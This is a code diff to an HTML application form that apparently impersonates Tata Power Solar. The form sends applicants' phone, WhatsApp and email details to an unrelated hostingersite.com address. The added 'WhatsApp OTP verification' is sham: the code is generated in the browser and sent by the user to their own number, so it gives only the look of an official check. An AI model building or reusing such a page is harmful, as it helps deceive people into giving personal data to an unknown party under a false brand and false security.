@@ -16,6 +16,8 @@
             --card-border: #e2e8f0;
             --text-main: #0f172a;
             --text-muted: #475569;
+            --whatsapp-green: #25D366;
+            --success-green: #16a34a;
         }
 
         * {
@@ -140,6 +142,7 @@
             flex: 1;
             display: flex;
             flex-direction: column;
+            position: relative;
         }
 
         label {
@@ -173,6 +176,73 @@
         select:focus {
             border-color: var(--tata-blue);
             background-color: #ffffff;
+        }
+
+        /* Verification Styles */
+        .input-with-btn {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-verify {
+            background-color: var(--whatsapp-green);
+            color: white;
+            border: none;
+            padding: 0 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-verify:hover {
+            background-color: #1eb954;
+        }
+
+        .verified-badge {
+            display: none;
+            color: var(--success-green);
+            font-size: 12px;
+            font-weight: 700;
+            align-items: center;
+            gap: 4px;
+            margin-top: 6px;
+        }
+
+        .otp-box {
+            display: none;
+            background: #f0fdf4;
+            border: 1px dashed var(--whatsapp-green);
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 10px;
+        }
+
+        .otp-box p {
+            font-size: 12px;
+            color: #166534;
+            margin-bottom: 8px;
+        }
+
+        .otp-input-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-otp-submit {
+            background-color: var(--tata-blue);
+            color: white;
+            border: none;
+            padding: 0 16px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
         }
 
         .option-group {
@@ -210,10 +280,16 @@
             letter-spacing: 0.8px;
             cursor: pointer;
             box-shadow: 0 4px 10px rgba(245, 124, 0, 0.3);
-            transition: background 0.2s;
+            transition: all 0.2s;
         }
 
-        .btn-submit:hover {
+        .btn-submit:disabled {
+            background-color: #cbd5e1;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn-submit:not(:disabled):hover {
             background-color: #e06d00;
         }
 
@@ -259,8 +335,8 @@
             </div>
         </div>
 
-        <!-- Corrected Form Action URL -->
-        <form action="https://firebrick-loris-550713.hostingersite.com/submit.php" method="POST">
+        <!-- Form Section -->
+        <form id="partnerForm" action="https://firebrick-loris-550713.hostingersite.com/submit.php" method="POST">
             <!-- Section 1: Personal & Business Contact -->
             <div class="section-card">
                 <div class="section-title">1. Applicant Details</div>
@@ -271,13 +347,32 @@
                     </div>
                     <div class="form-group">
                         <label>Primary Phone Number <span class="req">*</span></label>
-                        <input type="tel" name="phone" placeholder="Enter 10-digit mobile number" required>
+                        <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit mobile number" maxlength="10" required>
                     </div>
                 </div>
                 <div class="form-row">
                     <div class="form-group">
                         <label>WhatsApp Number <span class="req">*</span></label>
-                        <input type="tel" name="whatsapp" placeholder="Enter WhatsApp number" required>
+                        <div class="input-with-btn">
+                            <input type="tel" id="whatsapp" name="whatsapp" placeholder="Enter WhatsApp number" maxlength="10" required>
+                            <button type="button" id="sendOtpBtn" class="btn-verify" onclick="initiateWhatsAppVerification()">
+                                Send OTP
+                            </button>
+                        </div>
+                        
+                        <!-- Verified Badge -->
+                        <div id="verifiedBadge" class="verified-badge">
+                            ✓ WhatsApp Number Verified
+                        </div>
+
+                        <!-- OTP Box -->
+                        <div id="otpBox" class="otp-box">
+                            <p>Enter the 6-digit verification code generated for your WhatsApp:</p>
+                            <div class="otp-input-group">
+                                <input type="text" id="otpInput" maxlength="6" placeholder="ENTER OTP">
+                                <button type="button" class="btn-otp-submit" onclick="verifyOtp()">Verify</button>
+                            </div>
+                        </div>
                     </div>
                     <div class="form-group">
                         <label>Email Address <span class="req">*</span></label>
@@ -336,7 +431,7 @@
 
             <!-- Action Button -->
             <div class="btn-container">
-                <button type="submit" class="btn-submit">Submit Application</button>
+                <button type="submit" id="submitBtn" class="btn-submit" disabled>Submit Application</button>
             </div>
         </form>
 
@@ -347,6 +442,53 @@
 
     </div>
 
+    <!-- WhatsApp Verification Script -->
+    <script>
+        let generatedOtp = null;
+        let isVerified = false;
+
+        function initiateWhatsAppVerification() {
+            const waNumber = document.getElementById('whatsapp').value.trim();
+
+            if (waNumber.length !== 10 || isNaN(waNumber)) {
+                alert('Please enter a valid 10-digit WhatsApp number.');
+                return;
+            }
+
+            // Generate a 6-digit random OTP
+            generatedOtp = Math.floor(100000 + Math.floor(Math.random() * 900000)).toString();
+
+            // Open WhatsApp with pre-filled OTP message for self-verification
+            const textMessage = encodeURIComponent(`Tata Power Solar Application Verification Code: ${generatedOtp}\n\nPlease enter this code on the form to complete registration.`);
+            const waUrl = `https://wa.me/91${waNumber}?text=${textMessage}`;
+
+            // Open WhatsApp in a new tab
+            window.open(waUrl, '_blank');
+
+            // Show OTP Input Box
+            document.getElementById('otpBox').style.display = 'block';
+            document.getElementById('sendOtpBtn').innerText = 'Resend Code';
+        }
+
+        function verifyOtp() {
+            const userOtp = document.getElementById('otpInput').value.trim();
+
+            if (userOtp === generatedOtp && generatedOtp !== null) {
+                isVerified = true;
+                document.getElementById('otpBox').style.display = 'none';
+                document.getElementById('sendOtpBtn').style.display = 'none';
+                document.getElementById('whatsapp').readOnly = true;
+                
+                // Show Success Badge and Enable Form Submission
+                document.getElementById('verifiedBadge').style.display = 'flex';
+                document.getElementById('submitBtn').disabled = false;
+                
+                alert('WhatsApp Number Verified Successfully!');
+            } else {
+                alert('Invalid Security Code! Please check the code sent to your WhatsApp and try again.');
+            }
+        }
+    </script>
 </body>
 
 </html>
